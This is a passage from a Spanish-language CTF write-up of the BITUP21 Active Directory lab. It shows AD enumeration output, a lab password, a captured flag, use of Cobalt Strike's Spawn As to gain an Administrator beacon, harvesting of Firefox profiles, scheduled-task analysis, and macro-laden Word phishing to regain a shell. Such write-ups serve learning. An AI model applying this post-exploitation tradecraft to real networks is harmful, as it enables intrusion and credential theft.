ObjectCategory                       : CN=Computer,CN=Schema,CN=Configuration,D
                                       C=CIBERRESERVA,DC=COM
ObjectClass                          : computer
ObjectGUID                           : 5703fc73-0f25-4a59-ac2f-06c39e440904
objectSid                            : S-1-5-21-3684287403-3299824237-293173036
                                       2-1146
OperatingSystem                      : Windows Server 2016 Standard
OperatingSystemHotfix                : 
OperatingSystemServicePack           : 
OperatingSystemVersion               : 10.0 (14393)
PasswordExpired                      : False
PasswordLastSet                      : 05/10/2021 22:01:46
PasswordNeverExpires                 : False
PasswordNotRequired                  : False
PrimaryGroup                         : CN=Equipos del 
                                       dominio,CN=Users,DC=CIBERRESERVA,DC=COM
primaryGroupID                       : 515
PrincipalsAllowedToDelegateToAccount : {}
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132779377066838607
SamAccountName                       : OMEGA$
sAMAccountType                       : 805306369
sDRightsEffective                    : 0
ServiceAccount                       : {}
servicePrincipalName                 : {WSMAN/OMEGA, 
                                       WSMAN/OMEGA.CIBERRESERVA.COM, 
                                       TERMSRV/OMEGA, 
                                       TERMSRV/OMEGA.CIBERRESERVA.COM...}
ServicePrincipalNames                : {WSMAN/OMEGA, 
                                       WSMAN/OMEGA.CIBERRESERVA.COM, 
                                       TERMSRV/OMEGA, 
                                       TERMSRV/OMEGA.CIBERRESERVA.COM...}
SID                                  : S-1-5-21-3684287403-3299824237-293173036
                                       2-1146
SIDHistory                           : {}
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 4096
userCertificate                      : {}
UserPrincipalName                    : 
uSNChanged                           : 115724
uSNCreated                           : 29019
whenChanged                          : 22/10/2021 15:28:31
whenCreated                          : 05/08/2021 0:50:21
```

Contraseña: `r[P{crR1P1ax]bM`

Usamos la opción Spawn As de Cobalt para crear un nuevo beacon como Administrador en la máquina Omega.

Una vez entramos obtenemos la nueva flag:


```
bitup21{b102701bb676dcbda9d43e6effb064df}
```

# Intentos para pivotar hacia una nueva máquina

Esta fue la última flag que obtuvo nuestro equipo en la competición. Tuvimos un pequeño problema con Cobalt que afectó al resto de equipos por lo que decidimos pararlo y investigar que pasaba. Sospechamos que la causa fue la orden de descargar chorrocientos archivos dada por uno de los miembros del equipo. Revisando la información de la que disponemos, planteamos varios posibles caminos.
         
## Perfiles de Firefox
La mayoría de los usuarios tenían perfiles de Firefox en sus carpetas en `%APPDATA/Roaming`, nos los descargamos y revisamos las páginas visitadas, cookies y logins pero no sacamos nada interesante.
        
         
## Tareas programadas
         
Revisando las tareas programadas:
![](https://i.imgur.com/QszN4Jo.png)

Vemos la tarea que se encarga de descargar y abrir los ficheros Word del correo, y una tarea rara llamada Cesar Gandía Supervisión, con el siguiente contenido:
         
```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2021-10-05T22:08:14.3541512</Date>
    <Author>CIBERRESERVA\Administrador</Author>
    <Description>Tarea de supervision del usuario Cesar Gandia</Description>
    <URI>\Cesar Gandia Supervision</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>LeastPrivilege</RunLevel>
      <UserId>cgandia</UserId>
      <LogonType>Password</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-c Start-Sleep -s 15</Arguments>
    </Exec>
  </Actions>
</Task>
```
         
Planteamos esperar a que se ejecutara la tarea y impersonar al proceso (es posible??), pero no lo conseguimos.

# Resultados
         
![](https://i.imgur.com/6cs5Bhb.png)

![](https://i.imgur.com/iLP7lqw.png)

Como curiosidad, en un momento dado perdimos la shell de OMEGA, y nos tocó repetir el procedimiento de enviar el correo con el Word con macros.

![](https://i.imgur.com/5l3Jz7X.png)

Para evitar que volviera a ocurrir, la primera cosa que hicimos al recibir la nueva shell fue abrir otras 9.
         
         
# Conclusiones
             
Empezamos el CTF sin demasiadas espectativas, y la calidad del CTF ha sido brutal. 
         
Nos gustaría agradecer a la organización de [BITUP21](https://twitter.com/bitupalicante), (especialmente a Secu ([@secury](https://gitlab.com/secu77)) por su paciencia con nosotros :D), la organización de esta competición y en concreto de este laboratorio, que nos ha permitido aprender un montón.


Autores: Equipo Heappies (Isaac Lozano [@isaaclo97](https://twitter.com/isaac_lozano_97), Sergio Pérez [@SergioP3rez](https://twitter.com/SergioP3rez)  y Raúl Martín [@rmartinsanta](https://twitter.com/rmartinsanta))

